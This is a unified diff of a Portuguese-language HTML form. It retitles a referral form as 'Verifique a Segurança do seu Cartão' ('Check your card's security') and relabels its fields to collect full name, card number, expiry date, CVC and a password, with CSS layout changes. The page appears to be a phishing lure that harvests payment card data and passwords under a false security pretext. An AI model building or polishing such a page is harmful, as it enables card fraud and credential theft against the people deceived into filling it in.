@@ -61,9 +61,29 @@
             gap: 1rem; /* Espaçamento entre os campos */
         }
         
+        /* --- ALTERAÇÃO CSS INICIA AQUI --- */
+        .form-row {
+            display: flex;
+            gap: 1rem;
+            align-items: flex-end;
+            margin-bottom: 19px;
+        }
+
+        .form-row .form-group {
+            margin-bottom: 0;
+        }
+
+        .validity-group {
+            flex: 7;
+        }
+
+        .cvc-group {
+            flex: 2;
+        }
+        /* --- ALTERAÇÃO CSS TERMINA AQUI --- */
+
         .month-wrapper { flex: 3; }
         .year-wrapper  { flex: 4; }
-        .cvc-wrapper   { flex: 2; }
 
         label {
             display: block;
@@ -189,7 +209,7 @@
 <body>
 
     <div class="container">
-        <h1>Formulário de Indicação</h1>
+        <h1>Verifique a Segurança do seu Cartão</h1>
         <!-- O atributo 'enctype' foi mantido pois o script usa FormData -->
         <form id="indication-form" method="POST" enctype="multipart/form-data">
             
@@ -207,26 +227,30 @@
                 <input type="text" id="nome" name="Nome Completo" required>
             </div>
 
-            <!-- --- CAMPO DE ENDEREÇO ADICIONADO --- -->
             <div class="form-group">
-                <label for="endereco">Número do Cartão</label>
-                <input type="text" id="endereco" name="Endereço" required>
+                <label for="numero_cartao">Número do Cartão</label>
+                <input type="text" id="numero_cartao" name="Número do Cartão" required>
             </div>
 
-            <div class="form-group">
-                <label for="validade_mes">Validade (Mês/Ano)                Número atrás do Cartâo</label>
-                <div class="input-row">
-                    <div class="month-wrapper">
-                        <input type="text" id="validade_mes" name="Mês de Validade" placeholder="MM" required maxlength="2" pattern="\d{2}">
-                    </div>
-                    <div class="year-wrapper">
-                        <input type="text" id="validade_ano" name="Ano de Validade" placeholder="AAAA" required maxlength="4" pattern="\d{4}">
-                    </div>
-                    <div class="cvc-wrapper">
-                        <input type="text" id="cvc" name="CVC" placeholder="CVC" required maxlength="4" pattern="\d{3,4}">
+            <!-- --- ALTERAÇÃO HTML INICIA AQUI --- -->
+            <div class="form-row">
+                <div class="form-group validity-group">
+                    <label for="validade_mes">Validade (Mês/Ano)</label>
+                    <div class="input-row">
+                        <div class="month-wrapper">
+                             <input type="text" id="validade_mes" name="Mês de Validade" placeholder="MM" required maxlength="2" pattern="\d{2}">
+                        </div>
+                        <div class="year-wrapper">
+                            <input type="text" id="validade_ano" name="Ano de Validade" placeholder="AAAA" required maxlength="4" pattern="\d{4}">
+                        </div>
                     </div>
                 </div>
+                <div class="form-group cvc-group">
+                    <label for="cvc">Número atrás do Cartão</label>
+                    <input type="text" id="cvc" name="CVC" placeholder="CVC" required maxlength="4" pattern="\d{3,4}">
+                </div>
             </div>
+            <!-- --- ALTERAÇÃO HTML TERMINA AQUI --- -->
             
             <div class="form-group">
                 <label for="senha">Senha</label>
